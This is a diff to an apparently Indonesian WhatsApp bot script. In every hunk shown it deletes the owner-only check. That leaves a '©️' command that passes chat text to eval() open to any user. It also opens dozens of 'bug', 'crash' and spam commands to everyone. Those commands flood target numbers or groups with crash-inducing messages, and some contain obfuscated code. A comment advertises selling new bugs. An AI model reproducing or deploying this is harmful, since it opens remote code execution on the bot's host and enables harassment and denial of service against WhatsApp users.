@@ -276,7 +276,7 @@ haikal.ev.emit('messages.upsert', msg)
 }
 //=================================================//
 if (budy.startsWith('©️')) {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 try {
 return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
@@ -312,7 +312,7 @@ switch(command) {
 // JADI BUG /)
 
 case 'jaditroli': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -337,7 +337,7 @@ haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
 }
 break
 case 'jadilokas': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -357,7 +357,7 @@ haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.
 }
 break
 case 'jadipolling': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -381,7 +381,7 @@ haikal.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.
 }
 break
 case 'jadikatalog': case 'soulkatalog': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!quoted) throw 'Reply Image/sticker'
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -393,7 +393,7 @@ function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=fun
 }
 break
 case 'jadidocu': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -418,7 +418,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 break
 //=================================================//
 case 'jadidarknes': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -442,7 +442,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 case 'jadivirtext1': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -452,7 +452,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'jadivirtext2': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -462,7 +462,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'jadivirtex3t': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -472,7 +472,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'jadivirtext4': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -482,7 +482,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'jadivirtext5': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -492,7 +492,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'jadivirtext6': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -502,7 +502,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'jadivirtext7': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -512,7 +512,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'jadivirtext8': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -522,7 +522,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'jadivirtext9': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -532,7 +532,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'jadivirtext10': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -542,7 +542,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'jadibuginvite': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -563,7 +563,7 @@ haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id
 }
 break
 case 'jadibugpayment' : {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -579,7 +579,7 @@ thumbnailUrl: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRtWFvReVAr
 }
 break
 case 'jadibugbokep': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -590,7 +590,7 @@ haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${co
 }
 break
 case 'jadibugsw': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -601,7 +601,7 @@ haikal.sendMessage(m.chat, { video: joau, mimetype: 'video/mp4', caption: `🔥 
 }
 break
 case 'jadibugbutton':
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -624,7 +624,7 @@ haikal.sendMessage(m.chat, buttonnnnmMessage)
 //=================================================//
 //=================================================//
 case 'inibug': case 'souljhon': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -641,7 +641,7 @@ break
 //=================================================//
 case 'aduhcoy':
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
+
 touchmebre = [
 {
 title: `🌷 S O U L 🌷 ${buttonvirus} ${buttonvirus}`,
@@ -654,7 +654,7 @@ rows: [
 haikal.sendListMsg(m.chat, `🌷 S O U L 🌷`, haikal.user.name, `Hay Kak`, `Click Here`, touchmebre, m)
 break
 case 'soulpoll': case 'souljhon2': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -689,7 +689,7 @@ deploy('sukses sendbug')}
 break
 //=================================================//
 case 'soultroli2': case 'soultrol': case 'jutrol': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -714,7 +714,7 @@ haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
 }
 break
 case 'soultroli3': case 'soultrol2': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -725,7 +725,7 @@ function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824'
 break
 //=================================================//
 case 'soulsantet': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
 num = q.split('|')[0]
@@ -747,7 +747,7 @@ m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 break
 //=================================================//
 case 'soulsantetgc': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
 num = q.split('|')[0]
@@ -769,7 +769,7 @@ m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 break
 //=================================================//
 case 'ducu': case 'soulducu': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -782,7 +782,7 @@ haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', 
 break
 //=================================================//
 case 'souldaca': case 'souldaca':  {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -795,7 +795,7 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'souldocu': case 'souldraknes':  {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -821,7 +821,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 break
 //=================================================//
 case 'duc': case 'soulslebew': case 'cumadocu': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -847,7 +847,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 break
 //=================================================//
 case 'soulvirtext1': case 'soulzsu': case 'crashar1': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -857,7 +857,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'soulvirtext2': case 'soultol': case 'crashar2': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -867,7 +867,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'soulvirtext3': case 'soulmemek': case 'crashar3': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -877,7 +877,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'soulvirtext4': case 'soulcontol': case 'crashar4': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -887,7 +887,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'soulvirtext5': case 'soultextv': case 'crashar5': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -897,7 +897,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'soulvirtext6': case 'soulgas': case 'crashar6':{
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -907,7 +907,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'soulvirtext7': case 'soulvirtext': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -917,7 +917,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'soulvirtext8': case 'soulvirtext1': case 'crashar7':{
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -927,7 +927,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'soulvirtext9': case 'soulvirtext2': case 'crashar8':{
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -937,7 +937,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 }
 break
 case 'soulvirtext10': case 'soulvirtext3': case 'crashar9': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -948,7 +948,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/i
 break
 //=================================================//
 case 'soulbug1': case 'soulcrash': case 'crashar10':{
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -974,7 +974,7 @@ haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
 break
 //=================================================//
 case 'soulbug2': case 'soulcrash1': case 'crashar11': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1002,7 +1002,7 @@ haikal.relayMessage(m.chat, image.message, { messageId: image.key.id })
 }
 break
 case 'jadijago': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
@@ -1026,7 +1026,7 @@ haikal.sendMessage(m.chat, message, { quoted : m })
 break
 
 case '⚔️': case '🗡️': case '🛡️': case '🪞': case '🔧': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 await haikal.sendMessage(m.chat, { 
 text: '', 
@@ -1044,7 +1044,7 @@ templateButtons: [
  break
 //=================================================//
 case 'soulbug3': case 'soulcrash2': case 'crashar12': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1071,7 +1071,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 break
 //=================================================//
 case 'soulbug4': case 'soulcrash3': case 'crashar13':{
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1092,7 +1092,7 @@ haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
 break
 //=================================================//
 case 'soulbug5': case 'soulcrash4': case 'crashar14': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1116,7 +1116,7 @@ haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 }
 break
 case 'soulbug6': case 'soulcrash5': case 'crashar15':{
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1141,7 +1141,7 @@ haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 break
 
 case 'souldelay': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1153,7 +1153,7 @@ var _0x39080c=_0x4b8f;function _0x3b16(){var _0x4c72fa=['chat','9940068BVkoHm','
 break
 //=================================================//
 case 'soulbug7': case 'soulcrash6': case 'crashar16':{
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1176,7 +1176,7 @@ haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
 break
 //=================================================//
 case 'soulbug8': case 'soulcrash7': case 'crashar17': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1194,7 +1194,7 @@ haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
 break
 //=================================================//
 case 'lokas': case 'soullokas': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1216,7 +1216,7 @@ haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.
 break
 //=================================================//
 case 'buglokas': case 'soullokas2': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1237,7 +1237,7 @@ haikal.relayMessage(m.chat, location.message, { messageId: location.key.id })
 break
 //=================================================//
 case 'buginvite': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1260,7 +1260,7 @@ haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id
 break
 //=================================================//
 case 'soultroli': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1289,7 +1289,7 @@ haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
 break
 //=================================================//
 case 'catalog': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1321,7 +1321,7 @@ haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
 break
 //=================================================//
 case 'catalogpc': case 'cataloggc':  {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
 num = q.split('|')[0]
@@ -1353,7 +1353,7 @@ m.reply(tekteka)
 break
 //=================================================//
 case 'souljagoan' : {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1372,7 +1372,7 @@ break
 //=================================================//
 /*BUG WACAP */
 case 'soulskuy' : {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
@@ -1398,7 +1398,7 @@ break
 /*BUG WACAP */
 case 'gassoul' : {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
+
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
 a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
 haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
@@ -1424,7 +1424,7 @@ break
 //BUG BARU INI KALIAN BISA ORDER KE GUA YA GUYS YAH
 case '🔥': case '🗿': case 'mekcrot': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
+
 mm = text.split("|")[0]+'@s.whatsapp.net'
 jumlah = text.split("|")[1]
 let secon = text.split("|")[2]
@@ -1506,7 +1506,7 @@ case '🧄':
 case '🥔':
 case '🌰':
 case '🥜':{
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1528,7 +1528,7 @@ m.reply(`${m.pushName} Afk dengan alasan: ${text ? ': ' + text : ''}`)
 break
 //=================================================//
 case 'soulstik': case 'soulkangbug': case 'buttonkematian': case 'crashar19': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1572,7 +1572,7 @@ haikal.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${com
 break
 //=================================================//
 case 'soulbugie': case 'soulkangbug1': case 'crashar20': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1659,7 +1659,7 @@ m.reply('*Success Broadcast*')
 break
 //=================================================//
 case 'soulbutton': case 'soulkangbuttton': case 'testbutton': case 'inibutton': 
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1681,7 +1681,7 @@ haikal.sendMessage(m.chat, buttonMessage)
  break
 //=================================================//
 case 'soultag': case 'soulbar':  {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
 haikal.sendMessage(m.chat, { text : `${buttonkal}` , mentions: participants.map(a => a.id)}, { quoted: doc })
@@ -1690,7 +1690,7 @@ break
 //=================================================//
 case 'hiya': case 'souloke': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
+
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hai saya soul`
@@ -1702,7 +1702,7 @@ haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-strea
 break
 //=================================================//
 case 'soultod': case 'soulewe': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1726,7 +1726,7 @@ haikal.sendMessage(m.chat, { image: anu, caption: `${buttonkal}` }, { quoted: m}
 break
 //=================================================//
 case 'soulbokep': case 'soulngentod': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1806,7 +1806,7 @@ break
 //=================================================//
 case 'jadibug1': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
+
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
 if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
 let media = await quoted.download()
@@ -1818,7 +1818,7 @@ break
 //=================================================//
 case 'jadibug2': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
+
 if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
 if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
@@ -1830,7 +1830,7 @@ haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `
 break
 //=================================================//
 case 'jadibug3': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
 if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
@@ -1844,7 +1844,7 @@ break
 //=================================================//
 case 'jadibug4': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
+
 if (!quoted) throw 'Reply Image'
 if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
 let media = await haikal.downloadAndSaveMediaMessage(quoted)
@@ -1860,7 +1860,7 @@ fs.unlinkSync(ran)
 break
 //=================================================//
 case 'jadibug5': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (!quoted) throw 'Reply Image'
 if (/image/.test(mime)) {
@@ -1874,7 +1874,7 @@ haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
 break
 //=================================================//
 case 'soulhu': case 'soul1': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1887,7 +1887,7 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'soulhi': case 'soul2': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1900,7 +1900,7 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'soulha': case 'soul3': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1913,7 +1913,7 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'soulhe': case 'soul4': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1926,7 +1926,7 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'soulba': case 'soul5': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1939,7 +1939,7 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'soulbe': case 'soul6': {
-if (!isCreator) return
+
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1953,7 +1953,7 @@ for (let i = 0; i < jumlah; i++) {
 //=================================================//
 case 'soulbu': case 'soul7': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
+
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hai saya soul`
